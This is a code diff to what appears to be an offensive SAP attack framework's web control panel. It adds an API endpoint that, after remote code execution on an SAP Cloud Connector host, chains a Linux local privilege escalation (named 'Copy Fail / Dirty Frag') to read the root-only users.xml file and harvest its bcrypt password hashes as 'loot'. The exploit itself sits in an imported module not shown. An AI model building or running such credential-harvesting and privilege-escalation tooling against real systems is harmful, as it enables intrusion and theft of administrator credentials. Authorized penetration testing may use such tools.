@@ -3068,6 +3068,44 @@ def create_app(api: SAPMAPApi) -> Bottle:
         _bg(f"{sid}:harvest_scc", f"{sid}: Harvest SCC (post-RCE)", _run)
         return json.dumps({"status": "started"})
 
+    @app.route("/api/node/<sid>/harvest_scc_hashes_via_lpe", method="POST")
+    def node_harvest_scc_hashes_via_lpe(sid):
+        """Read /opt/sap/scc/config/users.xml as root by chaining the
+        Linux LPE.
+
+        Distinct from /harvest_scc (which tries five non-escalating
+        paths and stops if all fail) and from /harvest_scc_ssfs
+        (which reads SSFS_SCC.KEY/.DAT only).  This one assumes the
+        operator wants the bcrypt hash bundle even on a hardened host
+        and is OK with running Copy Fail / Dirty Frag to get there.
+        """
+        response.content_type = "application/json"
+        node = api.state.get_node(sid)
+        if not node:
+            return json.dumps({"error": f"Node {sid} not found"})
+
+        def _run():
+            _task_start(f"{sid}:harvest_scc_hashes_via_lpe",
+                        f"{sid}: Harvest SCC hashes via Linux LPE")
+            try:
+                from sap_scc_harvest import harvest_scc_hashes_via_lpe
+                res = harvest_scc_hashes_via_lpe(node, api.state)
+                if not res.get("ok"):
+                    print(f"[-] {sid}: harvest_scc_hashes_via_lpe: "
+                          f"{res.get('error')}")
+                else:
+                    print(f"[+] {sid}: harvest_scc_hashes_via_lpe → "
+                          f"{res.get('loot_path')} "
+                          f"({res.get('bytes_recovered')} B via "
+                          f"{res.get('method')})")
+            except Exception as e:
+                print(f"[-] {sid}: harvest_scc_hashes_via_lpe error: {e}")
+            finally:
+                _task_end(f"{sid}:harvest_scc_hashes_via_lpe")
+
+        threading.Thread(target=_run, daemon=True).start()
+        return json.dumps({"status": "started"})
+
     @app.route("/api/node/<sid>/harvest_scc_mappings", method="POST")
     def node_harvest_scc_mappings(sid):
         response.content_type = "application/json"
